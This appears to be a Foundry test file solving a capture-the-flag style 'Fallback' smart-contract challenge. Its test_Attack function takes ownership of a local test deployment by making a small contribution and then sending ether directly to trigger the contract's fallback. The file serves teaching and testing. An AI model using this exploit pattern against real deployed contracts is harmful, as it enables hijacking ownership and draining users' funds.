// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Fallback} from "../fallback/Fallback.sol";

contract FallbackTest is Test {
    address constant CONTRACT = address(42_000);
    address constant ATTACKER = address(42_001);
    Fallback fallbackContract;

    function setUp() public {
        // Set general test settings
        vm.roll(1);
        vm.warp(100);
        vm.deal(CONTRACT, 1000000000000000000);
        vm.deal(ATTACKER, 1000000000000000000);

        vm.prank(CONTRACT);
        fallbackContract = new Fallback();

        vm.stopPrank();
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 100);
    }

    function test_Attack() public {
        console.log(" ");
        console.log("====== INIT ========");
        console.log("deployer address : ");
        console.log(address(fallbackContract.owner()));
        console.log("contractOwner address: ");
        console.log(address(CONTRACT));
        assertEq(fallbackContract.owner(), CONTRACT);

        console.log(" ");
        console.log("====== STEP 1 ========");
        vm.expectRevert("caller is not the owner");
        vm.prank(ATTACKER);
        fallbackContract.withdraw();

        vm.prank(CONTRACT);
        uint contributionOwner = fallbackContract.getContribution();
        assertEq(contributionOwner, 1000000000000000000000);
        console.log("contribution owner : ");
        console.log(contributionOwner);
        vm.prank(ATTACKER);
        uint contributionAttacker = fallbackContract.getContribution();
        assertEq(contributionAttacker, 0);
        console.log("contribution attacker : ");
        console.log(contributionAttacker);

        console.log(" ");
        console.log("====== STEP 2 ========");
        vm.startPrank(ATTACKER);
        fallbackContract.contribute{value: 0.0001 ether}();
        uint newContributionAttacker = fallbackContract.getContribution();
        assertEq(newContributionAttacker, 100000000000000);
        console.log("contribution attacker : ");
        console.log(newContributionAttacker);
        vm.stopPrank();

        console.log(" ");
        console.log("====== STEP 3 ========");
        vm.prank(ATTACKER);
        (bool sent, ) = address(fallbackContract).call{value: 1}("");
        assert(sent);

        console.log("contractOwner address : ");
        console.log(address(fallbackContract.owner()));
        console.log("attacker address : ");
        console.log(address(ATTACKER));
        assertEq(fallbackContract.owner(), ATTACKER);
    }
}
